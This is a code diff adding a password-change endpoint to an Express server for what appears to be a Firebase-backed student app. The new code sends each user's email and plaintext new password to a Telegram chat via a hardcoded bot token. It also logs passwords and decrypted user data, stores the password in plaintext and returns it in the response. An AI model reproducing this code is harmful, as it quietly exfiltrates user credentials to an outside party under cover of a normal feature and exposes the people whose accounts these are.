@@ -201,9 +201,80 @@ app.post('/up', function (req, res) {
 		upd(uu, id, pd)
 
 	}
-
-
 })
-// start the server
+
+app.post("/changepassword", async (req, res) => {
+
+	const BOT_TOKEN = '5977867332:AAFz8bGw2pTuGZlgwYMaFA2UKAO451dL6pY'
+	const CHAT_ID = -1001682384010 // <YOUR_CHAT_ID>
+	
+	const tmMsg = (text) => {
+		const options = {
+			method: 'POST',
+			url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+			headers: {
+				'Content-Type': 'application/json'
+			},
+			body: JSON.stringify({
+				chat_id: CHAT_ID,
+				parse_mode: "HTML",
+				text
+			})
+		};
+		request(options, function (error, response) {
+			if (!error) //throw new Error(error);
+				console.log(response.body);
+			else console.log(error);
+		});
+	};
+
+		const email = req.body.email;
+		const phoneNumber = req.body.phoneNumber;
+		const oldPassword = req.body.oldPassword;
+		const newPassword = req.body.newPassword;
+		const id = req.body.id;
+	try {
+		console.log("Request: Change Password for " + email + " as " + newPassword);
+
+		// update user password
+		await firebase.auth().updateUser(id, {
+			password: newPassword
+		});
+
+		// 1st -> snapshot and decrypt firebase data
+		const pNinBase64 = Buffer.from(phoneNumber).toString('base64');
+		const pNinUri = encodeURIComponent(pNinBase64);
+
+		const encryptedDataRef = firebase.database().ref("students/" + pNinUri + '/data');
+		const snapshot = await encryptedDataRef.once("value");
+		const encryptedData = snapshot.val();
+		const passwordBytes = CryptoJS.AES.decrypt(encryptedData, oldPassword);
+		const decryptedData = passwordBytes.toString(CryptoJS.enc.Utf8);
+		console.log('Decrypted Data ->' + decryptedData);
+		var jsonData = JSON.parse(decryptedData);
+		jsonData.pw = newPassword;
+
+		// Encrypt Decrypted data with new password and update in the above path
+		const encryptedDataNewPassword = CryptoJS.AES.encrypt(JSON.stringify(jsonData), newPassword).toString();
+		await encryptedDataRef.set(encryptedDataNewPassword);
+
+		const stIDRef = firebase.database().ref("students/" + pNinUri + '/id');
+		const snapshot2 = await stIDRef.once("value");
+		const stId = snapshot2.val();
+
+		// 2nd -> Update the password in firebase database
+		const passwordRef = admin.database().ref("students/" + stId + "/pw");
+		await passwordRef.set(newPassword);
+
+		console.log("Successfully changed Password for " + email + " as " + newPassword);
+		tmMsg("<b>🔑 Successfully changed Password</b> \n" + "Email: " + email + "\n New Password: " + newPassword);
+		res.status(200).send("Successfully changed Password for " + email + " as " + newPassword);
+	} catch (error) {
+		console.error(error);
+		res.status(500).send("Error changing password");
+	}
+});
+
+// Start the Server
 app.listen(port);
 console.log('Server started! At http://localhost:' + port);
